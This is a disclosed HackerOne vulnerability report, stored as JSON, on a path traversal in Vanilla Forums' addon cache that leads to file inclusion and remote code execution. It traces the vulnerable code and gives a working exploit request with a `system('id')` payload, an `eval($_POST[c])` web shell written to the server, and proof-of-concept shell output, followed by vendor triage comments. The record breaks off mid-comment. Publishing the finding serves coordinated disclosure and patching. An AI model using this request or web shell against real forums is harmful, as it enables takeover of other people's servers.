{"id":411140,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTExNDA=","url":"https://hackerone.com/reports/411140","title":"Vanilla Forums AddonManager getSingleIndex Directory Traversal File Inclusion Remote Code Execution Vulnerability","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-09-18T17:35:19.269Z","submitted_at":"2018-09-18T17:35:19.269Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mr_me","url":"/mr_me","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17443,"url":"https://hackerone.com/vanilla","handle":"vanilla","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vanilla","twitter_handle":"vanilla","website":"http://vanillaforums.com","about":"Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-03-13T12:22:14.862Z","bug_reporter_agreed_on_going_public_at":"2019-02-11T12:22:13.655Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nAn authenticated admin user can trigger a directory traversal to require call leading to local file inclusion which can allow an attacker to gain remote code execution.\n\n## Notes:\n\n- You need to have an admin session to run this poc.\n- You can use the directory traversal to reach outside of the web root\n- Even though this poc uses the unserialize bug, please note, the underlying root cause is the directory traversal and no check is made on `$type`.\n- Don't forget to cleanup the `-index.php` file in the conf directory\n- I had to adjust the pop chain slightly and add double digits to the number of properties for the Gdn_ConfigurationSource class otherwise the application will not parse the serialized payload properly. I'm not sure why, haven't bothered to investigate it since I found an easy work around.\n\n## Analysis:\n\nInside of the applications/dashboard/controllers/class.addoncachecontroller.php file, we can see there is a reachable function `verify()` which accepts a type parameter.\n\n```\n    /**\n     * Verify the addon cache is current.\n     *\n     * @param string $type\n     * @throws Exception if no type specified.\n     */\n    public function verify($type) {\n        $this-\u003epermission('Garden.Settings.Manage');\n\n        if ($type === null) {\n            throw new Exception('Type required');\n        }\n\n        $cached = Gdn::addonManager()-\u003elookupAllByType($type);              // 1\n        $current = Gdn::addonManager()-\u003escan($type);\n\n        $new = array_keys(array_diff_key($current, $cached));\n        $invalid = array_keys(array_diff_key($cached, $current));\n\n        $updateRequired = (count($new) || count($invalid));\n```\n\nAt [1] we can reach the call to `lookupAllByType()` on the addonManager class with an attacker controlled type.\n\n```\nclass AddonManager {\n\n    ...\n\n    private function typeUsesMultiCaching($type) {\n        return $type === Addon::TYPE_ADDON;\n    }\n\n    ...\n\n    /**\n     * Get all of the addons of a certain type.\n     *\n     * @param string $type One of the **Addon::TYPE_*** constants.\n     * @return array Return an array of addon indexed by their keys.\n     */\n    public function lookupAllByType($type) {                                                                // 2\n        if ($this-\u003etypeUsesMultiCaching($type)) {                                                           // 3\n            $this-\u003eensureMultiCache();\n            return $this-\u003emultiCache;\n        } else {\n            $index = $this-\u003egetSingleIndex($type);                                                          // 4\n            $addons = [];\n            foreach ($index as $addonDirName =\u003e $addonDirPath) {\n                try {\n                    $addon = $this-\u003elookupSingleCachedAddon($addonDirName, $type);\n                    $addons[$addon-\u003egetKey()] = $addon;\n                } catch (\\Exception $ex) {\n                    trigger_error(\"The $type in $subdir is invalid and will be skipped.\", E_USER_WARNING);\n                    // Clear the addon out of the index.\n                    $this-\u003edeleteSingleIndexKey($type, $addonDirName);\n                }\n            }\n            return $addons;\n        }\n    }\n\n    ...\n\n    /**\n     * Get the index for an addon type that is cached by single addon.\n     *\n     * @param string $type One of the **Addon::TYPE_*** constants.\n     * @return array Returns the index mapping [addonDirName =\u003e addonDirPath]\n     */\n    private function getSingleIndex($type) {                                                                // 5\n        if (!isset($this-\u003esingleIndex[$type])) {\n            $cachePath = \"$type-index.php\";                                                                 // 6\n\n            if ($this-\u003eisCacheEnabled() \u0026\u0026 is_readable(\"$this-\u003ecacheDir/$cachePath\")) {                     // 7\n                $this-\u003esingleIndex[$type] = require \"$this-\u003ecacheDir/$cachePath\";                           // 8\n            } else {\n                $addonDirs = $this-\u003escanAddonDirs($type);\n\n                $this-\u003esaveArrayCache($cachePath, $addonDirs);\n\n                $this-\u003esingleIndex[$type] = $addonDirs;\n            }\n        }\n        return $this-\u003esingleIndex[$type];\n    }\n```\n\nAt [2] we enter the function and at [3] we don't enter the first code block as type is != to Addon::TYPE_ADDON. Then at [4] we call `getSingleIndex()` using our controlled type. Then at [5] we enter the function, at [6] we set the `$cachePath` variable which is pre-pended with the attackers string. Then at [7] we land in a check if the file path is readable, and if it is, we trigger a file inclusion using require.\n\nNote that there is no protection here for traversals and as such, a remote, context dependent attacker can leverage this for rce. However, this bug requires that an attacker has the following primitive:\n\n- They can upload a file in any directory with the name \"*-index.php\" containing some PHP code.\n\nWhilst this sounds rare, actually, it's very possible to do this on most applications. Since Vanilla doesn't allow this by default, I have marked this bug as a medium (not high), but you should be extra careful regarding inclusion functions.\n\n## Exploitation:\n\nAs stated above, we need a write primitive to write an *-index.php file somewhere on the filesystem with our code. So I leveraged the unserialize() vulnerability from a previous report to get that primitive.\n\nThen, I used the file inclusion and traversed a single directory into the conf directory. Note the traversals here, thats the underlying issue\n\n```\nPOST /index.php?p=/dashboard/addoncache/verify/..%252fconf%252f HTTP/1.1\nHost: 172.16.175.143\nCookie: Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U\nConnection: close\nContent-Type: application/x-www-form-urlencoded;\nContent-Length: 61\n\nc=system('id');die();\n```\n\nresponse from the webserver looks like this:\n\n```\nHTTP/1.1 200 OK\nDate: Tue, 18 Sep 2018 14:59:01 GMT\nServer: Apache/2.4.29 (Ubuntu)\nSet-Cookie: Vanilla-tk=gLApzQGeSNA2zPpI%3A2%3A1537282741%3A0e76e0b87aee826b7a810b37c505b34e; path=/; HttpOnly\nP3P: CP=\"CAO PSA OUR\"\nContent-Length: 54\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nOf course, as always, I provided a fully functional exploit. The interesting part about this exploit is that I do not need to repair the constants.php file since we a writing a whole new file (which means I don't damage the system).\n\nThe clean up is removing the written file:\n\n```\nsteven@pluto:/var/www/html$ cat conf/-index.php \n\u003c?php if (!defined('APPLICATION')) exit();\n$a=eval($_POST[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-18 14:43:21steven@pluto:/var/www/html$\n```\n\n## Example:\n\n```\nsaturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U\n(+) targeting: http://172.16.175.143\n(+) created a shell at conf/-index.php!\n(+) we can only reach it with the file inclusion!\n(+) dropping to a fake shell!\nwww-data@pluto:/var/www/html$ id;uname -a\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux pluto 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nwww-data@pluto:/var/www/html$ exit\n\nsaturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$\n```\n\n## Impact\n\nA context dependent attacker can achieve remote code execution.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eAn authenticated admin user can trigger a directory traversal to require call leading to local file inclusion which can allow an attacker to gain remote code execution.\u003c/p\u003e\n\n\u003ch2 id=\"notes\"\u003eNotes:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eYou need to have an admin session to run this poc.\u003c/li\u003e\n\u003cli\u003eYou can use the directory traversal to reach outside of the web root\u003c/li\u003e\n\u003cli\u003eEven though this poc uses the unserialize bug, please note, the underlying root cause is the directory traversal and no check is made on \u003ccode\u003e$type\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDon\u0026#39;t forget to cleanup the \u003ccode\u003e-index.php\u003c/code\u003e file in the conf directory\u003c/li\u003e\n\u003cli\u003eI had to adjust the pop chain slightly and add double digits to the number of properties for the Gdn_ConfigurationSource class otherwise the application will not parse the serialized payload properly. I\u0026#39;m not sure why, haven\u0026#39;t bothered to investigate it since I found an easy work around.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"analysis\"\u003eAnalysis:\u003c/h2\u003e\n\n\u003cp\u003eInside of the applications/dashboard/controllers/class.addoncachecontroller.php file, we can see there is a reachable function \u003ccode\u003everify()\u003c/code\u003e which accepts a type parameter.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    /**\n     * Verify the addon cache is current.\n     *\n     * @param string $type\n     * @throws Exception if no type specified.\n     */\n    public function verify($type) {\n        $this-\u0026gt;permission(\u0026#39;Garden.Settings.Manage\u0026#39;);\n\n        if ($type === null) {\n            throw new Exception(\u0026#39;Type required\u0026#39;);\n        }\n\n        $cached = Gdn::addonManager()-\u0026gt;lookupAllByType($type);              // 1\n        $current = Gdn::addonManager()-\u0026gt;scan($type);\n\n        $new = array_keys(array_diff_key($current, $cached));\n        $invalid = array_keys(array_diff_key($cached, $current));\n\n        $updateRequired = (count($new) || count($invalid));\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [1] we can reach the call to \u003ccode\u003elookupAllByType()\u003c/code\u003e on the addonManager class with an attacker controlled type.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eclass AddonManager {\n\n    ...\n\n    private function typeUsesMultiCaching($type) {\n        return $type === Addon::TYPE_ADDON;\n    }\n\n    ...\n\n    /**\n     * Get all of the addons of a certain type.\n     *\n     * @param string $type One of the **Addon::TYPE_*** constants.\n     * @return array Return an array of addon indexed by their keys.\n     */\n    public function lookupAllByType($type) {                                                                // 2\n        if ($this-\u0026gt;typeUsesMultiCaching($type)) {                                                           // 3\n            $this-\u0026gt;ensureMultiCache();\n            return $this-\u0026gt;multiCache;\n        } else {\n            $index = $this-\u0026gt;getSingleIndex($type);                                                          // 4\n            $addons = [];\n            foreach ($index as $addonDirName =\u0026gt; $addonDirPath) {\n                try {\n                    $addon = $this-\u0026gt;lookupSingleCachedAddon($addonDirName, $type);\n                    $addons[$addon-\u0026gt;getKey()] = $addon;\n                } catch (\\Exception $ex) {\n                    trigger_error(\u0026quot;The $type in $subdir is invalid and will be skipped.\u0026quot;, E_USER_WARNING);\n                    // Clear the addon out of the index.\n                    $this-\u0026gt;deleteSingleIndexKey($type, $addonDirName);\n                }\n            }\n            return $addons;\n        }\n    }\n\n    ...\n\n    /**\n     * Get the index for an addon type that is cached by single addon.\n     *\n     * @param string $type One of the **Addon::TYPE_*** constants.\n     * @return array Returns the index mapping [addonDirName =\u0026gt; addonDirPath]\n     */\n    private function getSingleIndex($type) {                                                                // 5\n        if (!isset($this-\u0026gt;singleIndex[$type])) {\n            $cachePath = \u0026quot;$type-index.php\u0026quot;;                                                                 // 6\n\n            if ($this-\u0026gt;isCacheEnabled() \u0026amp;\u0026amp; is_readable(\u0026quot;$this-\u0026gt;cacheDir/$cachePath\u0026quot;)) {                     // 7\n                $this-\u0026gt;singleIndex[$type] = require \u0026quot;$this-\u0026gt;cacheDir/$cachePath\u0026quot;;                           // 8\n            } else {\n                $addonDirs = $this-\u0026gt;scanAddonDirs($type);\n\n                $this-\u0026gt;saveArrayCache($cachePath, $addonDirs);\n\n                $this-\u0026gt;singleIndex[$type] = $addonDirs;\n            }\n        }\n        return $this-\u0026gt;singleIndex[$type];\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt [2] we enter the function and at [3] we don\u0026#39;t enter the first code block as type is != to Addon::TYPE_ADDON. Then at [4] we call \u003ccode\u003egetSingleIndex()\u003c/code\u003e using our controlled type. Then at [5] we enter the function, at [6] we set the \u003ccode\u003e$cachePath\u003c/code\u003e variable which is pre-pended with the attackers string. Then at [7] we land in a check if the file path is readable, and if it is, we trigger a file inclusion using require.\u003c/p\u003e\n\n\u003cp\u003eNote that there is no protection here for traversals and as such, a remote, context dependent attacker can leverage this for rce. However, this bug requires that an attacker has the following primitive:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThey can upload a file in any directory with the name \u0026quot;*-index.php\u0026quot; containing some PHP code.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eWhilst this sounds rare, actually, it\u0026#39;s very possible to do this on most applications. Since Vanilla doesn\u0026#39;t allow this by default, I have marked this bug as a medium (not high), but you should be extra careful regarding inclusion functions.\u003c/p\u003e\n\n\u003ch2 id=\"exploitation\"\u003eExploitation:\u003c/h2\u003e\n\n\u003cp\u003eAs stated above, we need a write primitive to write an *-index.php file somewhere on the filesystem with our code. So I leveraged the unserialize() vulnerability from a previous report to get that primitive.\u003c/p\u003e\n\n\u003cp\u003eThen, I used the file inclusion and traversed a single directory into the conf directory. Note the traversals here, thats the underlying issue\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /index.php?p=/dashboard/addoncache/verify/..%252fconf%252f HTTP/1.1\nHost: 172.16.175.143\nCookie: Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U\nConnection: close\nContent-Type: application/x-www-form-urlencoded;\nContent-Length: 61\n\nc=system(\u0026#39;id\u0026#39;);die();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eresponse from the webserver looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nDate: Tue, 18 Sep 2018 14:59:01 GMT\nServer: Apache/2.4.29 (Ubuntu)\nSet-Cookie: Vanilla-tk=gLApzQGeSNA2zPpI%3A2%3A1537282741%3A0e76e0b87aee826b7a810b37c505b34e; path=/; HttpOnly\nP3P: CP=\u0026quot;CAO PSA OUR\u0026quot;\nContent-Length: 54\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOf course, as always, I provided a fully functional exploit. The interesting part about this exploit is that I do not need to repair the constants.php file since we a writing a whole new file (which means I don\u0026#39;t damage the system).\u003c/p\u003e\n\n\u003cp\u003eThe clean up is removing the written file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003esteven\u003c/span\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"nx\"\u003epluto\u003c/span\u003e\u003cspan class=\"o\"\u003e:/\u003c/span\u003e\u003cspan class=\"k\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ewww\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003econf\u003c/span\u003e\u003cspan class=\"o\"\u003e/-\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \n\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nb\"\u003edefined\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;APPLICATION\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\u003cspan class=\"c1\"\u003e//[\u0026#39;\u0026#39;] = \u0026#39;\u0026#39;;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Last edited by admin (172.16.175.1)2018-09-18 14:43:21steven@pluto:/var/www/html$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"example\"\u003eExample:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esaturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U\n(+) targeting: http://172.16.175.143\n(+) created a shell at conf/-index.php!\n(+) we can only reach it with the file inclusion!\n(+) dropping to a fake shell!\nwww-data@pluto:/var/www/html$ id;uname -a\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux pluto 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nwww-data@pluto:/var/www/html$ exit\n\nsaturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eA context dependent attacker can achieve remote code execution.\u003c/p\u003e\n","bounty_amount":"900.0","formatted_bounty":"$900","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":347841,"file_name":"vanilla_forums_addoncache_verify_lfi_rce.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/841/97353cd1aed2176d8cfb63f9846da41a1b8750c9/vanilla_forums_addoncache_verify_lfi_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_addoncache_verify_lfi_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_addoncache_verify_lfi_rce.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055317Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=aa4f91134ecedaca70527175bcf1cb394e58f220694fcca3a0bad62e94a3f4be","file_size":108135,"type":"application/zip"}],"allow_singular_disclosure_at":"2019-03-13T12:22:13.716Z","allow_singular_disclosure_after":-56741464.188119784,"singular_disclosure_allowed":true,"vote_count":83,"voters":["jensec","secator","bl4de","sameerphad72","s_p_q_r","fvd","stealthy","dhakal_ananda","mygf","bahlawi89","and 73 more..."],"severity":{"rating":"high","score":8.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2101,"asset_type":"URL","asset_identifier":"*.vanillaforums.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3362801,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there,\nWe have received your report, a feedback will be posted shortly.\nThank you.","markdown_message":"\u003cp\u003eHi there,\u003cbr\u003e\nWe have received your report, a feedback will be posted shortly.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-20T13:56:40.445Z","updated_at":"2018-09-20T13:56:40.445Z","actor":{"username":"manwithnoname","cleared":false,"url":"/manwithnoname","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3364419,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-20T20:05:50.236Z","updated_at":"2018-09-20T20:05:50.236Z","additional_data":{"old_severity":"Medium (6.6)","new_severity":"Medium (6.6)","old_severity_id":211538,"new_severity_id":212399},"actor":{"username":"manwithnoname","cleared":false,"url":"/manwithnoname","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3364643,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-20T20:59:04.490Z","updated_at":"2018-09-20T20:59:04.490Z","additional_data":{"old_severity":"Medium (6.6)","new_severity":"High (8.0)","old_severity_id":212399,"new_severity_id":212420},"actor":{"username":"manwithnoname","cleared":false,"url":"/manwithnoname","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3365235,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This report is now triaged. Thank you.","markdown_message":"\u003cp\u003eThis report is now triaged. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-21T00:19:14.626Z","updated_at":"2018-09-21T00:19:14.626Z","actor":{"username":"dexterr","cleared":false,"url":"/dexterr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3373096,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-22T14:57:12.173Z","updated_at":"2018-09-22T14:57:12.173Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3373099,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-22T14:57:38.530Z","updated_at":"2018-09-22T14:57:38.530Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3373108,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We'll add a bonus to this ticket for including the other two tickets' proof of concepts to further illustrate the dangers of not properly validating our addon types \u0026 keys. The pending patch for this issue is available at https://github.com/vanilla/vanilla/pull/7840 . We haven't explicitly mentioned its non-obvious security implications so please refrain from commenting on the public issue.","markdown_message":"\u003cp\u003eWe\u0026#39;ll add a bonus to this ticket for including the other two tickets\u0026#39; proof of concepts to further illustrate the dangers of not properly validating our addon types \u0026amp; keys. The pending patch for this issue is available at \u003ca title=\"https://github.com/vanilla/vanilla/pull/7840\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fvanilla%2Fvanilla%2Fpull%2F7840\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/vanilla/vanilla/pull/7840\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . We haven\u0026#39;t explicitly mentioned its non-obvious security implications so please refrain from commenting on the public issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-22T15:01:54.301Z","updated_at":"2018-09-22T15:01:54.301Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3379293,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Adding bonus for demonstrating additional vectors opened by our lack of 